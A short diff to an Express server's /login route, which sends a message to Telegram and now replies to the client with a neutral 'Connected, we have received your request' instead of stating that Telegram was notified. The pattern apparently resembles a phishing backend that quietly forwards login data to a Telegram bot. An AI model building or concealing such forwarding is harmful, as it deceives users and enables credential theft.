@@ -36,7 +36,7 @@ app.post("/login", async (req, res) => {
 
   try {
     await sendTelegramMessage(mensaje);
-    res.json({ status: "ok", mensaje: "✅ Notificación enviada a Telegram." });
+    res.json({ status: "Conectado", mensaje: "✅ Hemos recibido tu solicitud." });
   } catch (error) {
     console.error("Error enviando a Telegram:", error);
     res.status(500).json({ status: "error", mensaje: "❌ Error al notificar." });
